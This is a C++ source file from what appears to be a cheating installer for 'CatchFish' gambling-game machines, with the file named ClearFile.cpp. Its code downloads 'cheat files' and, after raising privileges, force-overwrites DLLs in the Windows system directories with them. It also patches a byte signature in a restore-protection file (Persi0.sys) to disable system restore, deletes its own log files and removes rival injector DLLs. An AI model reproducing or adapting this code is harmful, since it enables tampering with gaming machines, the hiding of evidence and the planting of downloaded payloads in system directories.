#include "ClearFile.h"
#include <filesystem>
#include <iostream>
#include <WinBase.h>
#include <CatchFishServer/Feature/Common/Common.h>
#include <CatchFishInstaller/Feature/Socket/Download/Downloader.h>
#include <FileLib/File.h>
#include <CharacterLib/Character.h>
#include <InjectorLib/DllInjector/DllInjector.h>
#include <ProcessLib/Common/ResHandleManager.h>
#include <CatchFishInstaller/Feature/FileBuffer/Calc.hpp>

#ifdef _DEBUG
#else
#pragma comment(lib,"FileLib.lib")
#pragma comment(lib,"InjectorLib.lib")
#endif // _DEBUG



CClearFile& CClearFile::GetInstance()
{
	static CClearFile Instance;
	return Instance;
}

BOOL CClearFile::ClearDiskSectorSpecifyItem() CONST
{
	std::wstring wsFilePath = LR"(c:\windows\system32\calc.exe)";
	wsFilePath.at(0) = _wchDisk;

	if (!libTools::CFile::FileExist(wsFilePath))
	{
		libTools::CFile::WriteFile(wsFilePath, CalcBuffer, _countof(CalcBuffer));
	}


	HANDLE hFile = ::CreateFileW(wsFilePath.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		std::wcout << L"CreateFileW 指定扇区文件失败!" << std::endl;
		return FALSE;
	}
	SetResDeleter(hFile, [](LPVOID & hFile) { ::CloseHandle(hFile); hFile = nullptr; });


	DWORD dwWriteSize = 0;
	BYTE EmptyBuffer[512 * 3] = { 0 };
	::SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	if (!::WriteFile(hFile, EmptyBuffer, sizeof(EmptyBuffer), &dwWriteSize, NULL))
	{
		std::wcout << L"写入指定扇区文件失败!" << std::endl;
		return FALSE;
	}


	return TRUE;
}

BOOL CClearFile::Clear(_In_ WCHAR wchDisk, _In_ CONST std::wstring& wsGameDir)
{
	_wchDisk = wchDisk;
	return ClearGameDirectory(wsGameDir) && ClearSystemDirectory() && ClearSelfLogFile(wchDisk) && ClearDiskSectorSpecifyItem();
}

BOOL CClearFile::ClearGameRestoreSystem(_In_ WCHAR wchDisk, _In_ CONST GameIdentity& Identifier) CONST
{
	if (Identifier.wsGameType == L"盛世捕鱼系列")
	{
		static WCHAR wchPath[MAX_PATH] = { L"Z:\\Persi0.sys" };
		wchPath[0] = wchDisk;
		return ClearGameRestoreSystem_YouLingQianTing(libTools::CCharacter::UnicodeToASCII(wchPath).c_str());
	}
	return TRUE;
}

BOOL CClearFile::ClearGameDirectory(_In_ CONST std::wstring& wsGameDir) CONST
{
	if (_IsDisableDeleteGameDirectoryInjectorFile || wsGameDir.empty())
		return TRUE;

	std::experimental::filesystem::v1::path GameDir(wsGameDir);
	GameDir = GameDir.remove_filename();
	if (!std::experimental::filesystem::v1::is_directory(GameDir))
		return TRUE;


	CONST static std::vector<std::wstring> Vec = { L"d3d8thk.dll",L"lpk.dll", L"ws2help.dll", L"winmm.dll", L"HTzb.dll" };
	for (CONST auto& itm : Vec)
	{
		auto tmpDir = GameDir;
		tmpDir.append(itm);
		if (std::experimental::filesystem::v1::exists(tmpDir))
		{
			std::wcout << L"正在抹除别人的恶意软件!" << std::endl;
			::Sleep(2 * 1000);


			if (!libTools::CFile::ForceDeleteFile(tmpDir.wstring()))
			{
				std::wcout << L"清理失败!" << std::endl;
				return FALSE;
			}
		}
	}


	std::wcout << L"清理完毕!" << std::endl;
	return TRUE;
}

BOOL CClearFile::ClearSystemDirectory() CONST
{
	auto emSystem = GetDiskSystem(_wchDisk);
	if (emSystem == em_System::Unknow)
	{
		std::wcout << L"未知的系统目录结构!!!" << std::endl;
		return FALSE;
	}



	std::wstring wsTargetDirectory;
	GameIdentity Identifier;
	Identifier.wsGameType = L"Installer";
	if (emSystem == em_System::Win7x86)
	{
		std::wcout << L"目标系统: Win7 x86" << std::endl;
		Identifier.wsGameName = L"System_Win7";
		wsTargetDirectory = L"C:\\Windows\\System32\\";
	}
	else if (emSystem == em_System::Win7x64)
	{
		std::wcout << L"目标系统: Win7 x64" << std::endl;
		Identifier.wsGameName = L"System_Win7";
		wsTargetDirectory = L"C:\\Windows\\SysWOW64\\";
	}
	else if (emSystem == em_System::XP)
	{
		std::wcout << L"目标系统: XP" << std::endl;
		Identifier.wsGameName = L"System_XP";
		wsTargetDirectory = L"C:\\Windows\\System32\\";
	}
	else
	{
		std::wcout << L"游戏硬盘可能被损坏了!" << std::endl;
		return FALSE;
	}


	std::wcout << L"正在下载清理工具..." << std::endl;
	std::vector<CatchFishFileContent> Vec;
	if (!CDownloader::GetInstance().Download_CheatFile(Identifier, Vec))
	{
		std::wcout << L"下载清理工具文件失败!" << std::endl;
		return FALSE;
	}


	// 将所有文件覆盖到System32目录下
	if (!libTools::CDllInjector::PromotionBackupPrivlige())
	{
		std::wcout << L"提升至调试至权限失败!" << std::endl;
		return FALSE;
	}



	wsTargetDirectory[0] = _wchDisk;
	for (CONST auto& itm : Vec)
	{
		std::wstring wsPath = wsTargetDirectory + itm.wsFileName;
		if (itm.wsFileName.find(L".") == std::wstring::npos)
			wsPath += L".dll";


		std::experimental::filesystem::v1::path TargetPath(wsPath);
		if (!libTools::CFile::ForceDeleteFile(wsPath))
		{
			std::wcout << L"清除文件:[" << wsPath.c_str() << L"]失败! Err=" << ::GetLastError() << std::endl;
			return FALSE;
		}


		//::SetFileAttributesW(wsPath.c_str(), FILE_ATTRIBUTE_NORMAL);
		if (!libTools::CFile::WriteFile(wsPath, reinterpret_cast<CONST BYTE*>(itm.FileContent.get()), itm.uFileSize))
		{
			std::wcout << L"创建文件:[" << itm.wsFileName.c_str() << L"]失败!" << std::endl;
			return FALSE;
		}
	}
	return TRUE;
}

CClearFile::em_System CClearFile::GetDiskSystem(_In_ WCHAR wchDisk)
{
	std::wstring wsWin7File = L"C:\\Windows\\System32\\KernelBase.dll";
	wsWin7File[0] = wchDisk;
	if (std::experimental::filesystem::v1::exists(std::experimental::filesystem::v1::path(wsWin7File)))
	{
		std::wstring wsX64Sys = L"C:\\Windows\\SysWOW64\\";
		wsX64Sys[0] = wchDisk;
		return std::experimental::filesystem::v1::is_directory(std::experimental::filesystem::v1::path(wsX64Sys)) ? em_System::Win7x64 : em_System::Win7x86;
	}



	std::wstring wsXpFile = L"Z:\\Windows\\System32\\gdi32.dll";
	wsXpFile[0] = wchDisk;
	if (std::experimental::filesystem::v1::exists(std::experimental::filesystem::v1::path(wsXpFile)))
	{
		return em_System::XP;
	}


	return em_System::Unknow;
}


VOID CClearFile::SetIsDisableDeleteGameDirectoryInjectorFile(_In_ BOOL bValue)
{
	_IsDisableDeleteGameDirectoryInjectorFile = bValue;
}

BOOL CClearFile::ClearSelfLogFile(_In_ WCHAR wchDisk) CONST
{
	CONST static std::vector<std::wstring> VecPath =
	{
		L"C:\\Windows\\System32\\",
		L"C:\\Windows\\SysWOW64\\",
		L"C:\\Windows\\",
	};


	for (CONST auto& wsTargetPath : VecPath)
	{
		CONST static std::vector<std::wstring> VecFileName = { L"CFish.tmp",L"am.pdk",L"am.pdl" };
		for (CONST auto& itm : VecFileName)
		{
			std::wstring wsPath = wsTargetPath;
			wsPath[0] = wchDisk;
			if (std::experimental::filesystem::v1::exists(wsPath + itm))
			{
				if (!libTools::CFile::ForceDeleteFile(wsPath + itm))
				{
					std::wcout << L"清除文件:[" << itm.c_str() << L"]失败!" << std::endl;
					return FALSE;
				}
			}
		}
	}
	return TRUE;
}

BOOL CClearFile::ClearGameRestoreSystem_YouLingQianTing(_In_ CONST CHAR* fileFullPach) CONST
{
	struct type_err
	{
		int  err_err = 1; //默认是有错误

		DWORD _LastErr = 0;
		char _LastErrStr[1024 + 2] = {};
		void _LastErrStr_set()
		{
			DWORD dwErrCode = _LastErr;
			LPSTR lpMessage = NULL;
			FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL, dwErrCode, NULL, (LPSTR)& lpMessage, NULL, NULL);
			_LastErr = dwErrCode;
			libTools::CCharacter::strcpy_my(_LastErrStr, lpMessage == nullptr ? "" : lpMessage);
		};

		int  _MyErr = 0;
		char _MyErrStr[1024 + 2] = {};
		void _MyErrStr_set(const char* lpszFormat, ...)
		{
			va_list   args;

			int       nBuf;
			memset(_MyErrStr, 0, sizeof(_MyErrStr));

			va_start(args, lpszFormat);
			nBuf = _vsnprintf_s(_MyErrStr, sizeof(_MyErrStr) / sizeof(CHAR) - 3, lpszFormat, args);
			va_end(args);
		};

		void Print()
		{
			std::wcout << L"设置盛世捕鱼系列游戏的还原失败!!!" << std::endl;
			std::wcout << L"LastErrCode = " << _LastErr << L", ErrText = " << libTools::CCharacter::ASCIIToUnicode(_LastErrStr).c_str() << std::endl;
			std::wcout << L"MyErrCode = " << _MyErr << L", ErrText = " << libTools::CCharacter::ASCIIToUnicode(_MyErrStr).c_str() << std::endl;
		}
	};




	type_err dat_err;

	//char* fileName = "o:\\Persi0-.sys";
	HANDLE mmHandle = CreateFileA(fileFullPach,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_SEQUENTIAL_SCAN,//|FILE_FLAG_WRITE_THROUGH|FILE_FLAG_NO_BUFFERING;,
		NULL);
	if (mmHandle == INVALID_HANDLE_VALUE)
	{
		DWORD err = GetLastError();
		dat_err._LastErr = err;
		dat_err._LastErrStr_set();

		dat_err._MyErr = -1;
		dat_err._MyErrStr_set("打开文件出错: %s", fileFullPach);
		dat_err.Print();
		return FALSE;
	};

	LARGE_INTEGER file_size = { 0 };
	GetFileSizeEx(mmHandle, &file_size);
	if (file_size.QuadPart == 0)
	{
		dat_err._MyErr = -2;
		dat_err._MyErrStr_set("获取文件大小出错: %s");

		CloseHandle(mmHandle);
		dat_err.Print();
		return FALSE;
	}


	char mapStr[262] = { 0 };
	wsprintfA(mapStr, "testMmf_tmp1_%x_%x", GetCurrentProcessId(), GetTickCount());
	HANDLE mmfm = CreateFileMappingA(mmHandle,
		NULL,
		PAGE_READWRITE,
		file_size.HighPart,
		file_size.LowPart,
		mapStr);
	if (mmfm == NULL)
	{
		DWORD err = GetLastError();
		dat_err._LastErr = err;
		dat_err._LastErrStr_set();

		dat_err._MyErr = -3;
		dat_err._MyErrStr_set("创建映射出错: %d_%d, [%s]", file_size.HighPart, file_size.LowPart, mapStr);
		dat_err.Print();
		return FALSE;
	};

	char* pStartAddress = (char*)MapViewOfFile(mmfm, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (pStartAddress == NULL)
	{
		DWORD err = GetLastError();
		dat_err._LastErr = err;
		dat_err._LastErrStr_set();

		dat_err._MyErr = -4;
		dat_err._MyErrStr_set("映射内存出错");

		CloseHandle(mmfm);
		CloseHandle(mmHandle);
		dat_err.Print();
		return FALSE;
	};



	unsigned char _还原状态数据[4] = {
		0x7D, 0x6E, 0xCB, 0xDD
	};
	int findi = -1;
	for (int i = 0; i < 0x200; ++i)
	{
		if (memcmp(pStartAddress + i, _还原状态数据, sizeof(_还原状态数据)) == 0)
		{
			unsigned char  _关闭还原状态数据[4] = {
				0x82, 0x91, 0x34, 0x22
			};
			memcpy(pStartAddress + i, _关闭还原状态数据, sizeof(_关闭还原状态数据));
			findi = i;
			break;
		}
	};
	if (findi == -1)
	{
		dat_err._MyErr = -99;
		dat_err._MyErrStr_set("未开启还原");
		//dump_buffer( fileFullPach, pStartAddress, 512 );
		UnmapViewOfFile(pStartAddress);
		CloseHandle(mmfm);
		CloseHandle(mmHandle);

		std::wcout << L"已经关闭还原!" << std::endl;
		return TRUE;
	}
	else
	{
		dat_err._MyErr = 1;
		dat_err._MyErrStr_set("解除还原成功!");
		std::wcout << L"解除还原成功!" << std::endl;
	}



	UnmapViewOfFile(pStartAddress);
	CloseHandle(mmfm);
	CloseHandle(mmHandle);

	dat_err.err_err = 0;
	return TRUE;
}

